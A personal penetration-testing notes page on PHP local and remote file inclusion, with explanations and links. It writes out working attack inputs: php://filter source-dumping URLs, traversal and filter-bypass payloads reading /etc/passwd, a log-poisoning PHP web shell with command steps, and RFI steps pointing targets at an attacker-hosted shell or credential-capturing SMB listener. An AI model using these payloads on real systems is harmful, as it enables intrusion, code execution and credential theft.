**Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow_url_include**). 

**Local File Inclusion (LFI):** The sever loads a local file.
# Guides

1. [File Inclusion/Path traversal | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
2. [Comprehensive Guide on Local File Inclusion (LFI) - Hacking Articles](https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/)

Check the source of the website and the website fuzzing report for potential parameters which may be vulnerable.

## Automatic Tool

1. [GitHub - kurobeats/fimap: fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.](https://github.com/kurobeats/fimap)
# Local File Include

Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files on the server through the web browser. This can lead to sensitive information disclosure, code execution, and other security issues. 

To exploit LFI, an attacker needs to find a vulnerable parameter in the application that includes files. This parameter can be a URL, a file path, or any other input that gets included in the server-side code. 

There are several techniques to exploit LFI, such as directory traversal, null byte injection, and using wrappers like php://input or data://. 

1. Just try the parameter (e.g. `book.php?bookNumber=/etc/password`) and see what happens
2. Supported wrappers, see [PHP: Supported Protocols and Wrappers - Manual](https://secure.php.net/manual/en/wrappers.php)
3. If files can be viewed
	1. If the log file is available, see [[#Log Poisoning]]
	2. Search for credentials, see [[4. Post Exploitation/Valuable Files]]
4. Potentially be able to get the source of the site using the wrappers, see [[#PHP Wrappers]]
5. Vulnerable PHP functions: require, require_once, include, include_once

## PHP Wrappers

### Website Source Retrieval

These return the Base64 of the site, see [[Base64]] to decode.

- `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=view`
- `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=upload`
- `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=index`
### Unzip File

[[Web#ZIP Wrapper LFI]]
## LFI Bypass Filtering

See [[Web Application Firewall (WAF)]]

- Null byte: `http://10.10.10.80/?op=../../../etc/passwd%00&secretname=2f4823095649cab523452053417cded1dee9259e`
- Double encoding: `http://10.10.10.80/?op=%252e%252e%252fetc%252fpasswd&secretname=2f4823095649cab523452053417cded1dee9259e`
- Path truncation: `http://10.10.10.80/?op=../../../../[…]../../../../../etc/passwd&secretname=2f4823095649cab523452053417cded1dee9259e`
## LFI Shell

`curl -s 'http://192.168.120.85/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini%00%27%7C base64 -d 2>/dev/null`

## Log Poisoning

Log poisoning is a technique used to manipulate log files on a server by injecting malicious input. This can be used in combination with Local File Inclusion (LFI) vulnerabilities to escalate an attack. 

Effectively if you can view a log file using LFI, you can manipulate the logs by maybe inputting a username which is actually a PHP web shell, then navigating to the log file using LFI, which may run the shell.

### Walkthrough

1. [RCE via LFI Log Poisoning - The Death Potion | by Jerry Shah (Jerry) | Medium](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d#:~:text=What%20is%20log%20poisoning%20%3F,input%20to%20the%20server%20log)

### Guide

1. Find the log file using LFI
2. Find the technology the log file is for, e.g. FTP
3. Generate a log message using that technology with a malicious entry, e.g. FTP username: `<?php system($_GET[‘commandInjection’]); ?>` 
4. Navigate to the log file using LFI
5. `_/var/log/vsftpd.log&commandInjection=ifconfig

### Log File Locations

1. `/var/log/auth.log`
2. `/var/log/vsftpd.log`

## PHP Session

If the website uses the PHP Session (PHPSESSID) cookie.
[File Inclusion/Path traversal | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions)

# Remote File Include

Remote File Inclusion (RFI) is a vulnerability similar to LFI, but instead of including local files, it includes files from a remote server. This can be particularly dangerous as it allows an attacker to execute code on the server by including a malicious file hosted on their own server.

To exploit RFI, an attacker needs to find a vulnerable parameter in the application that includes files from a remote server. This parameter can be a URL pointing to the remote file. 

1. Replace the parameter with the remote IP of your machine, e.g. `/blog/?lang=\\10.10.14.29\\test`
2. Host a Python webserver
3. Point the website at a [[Web|Web Shell]] 

## Guide

1. Point the RFI at a [[3. Exploitation/Obtaining Remote Shells/Generic Tooling/Netcat]] to see the request made first
	1. If a SMB request is made, see [[2. Enumeration/TCP/445. SMB/1. Guide#Responder|SMB Responder]] to capture credentials
2. Can be used to check for internal ports which are open, see [[Server-side request forgery (SSRF)]]


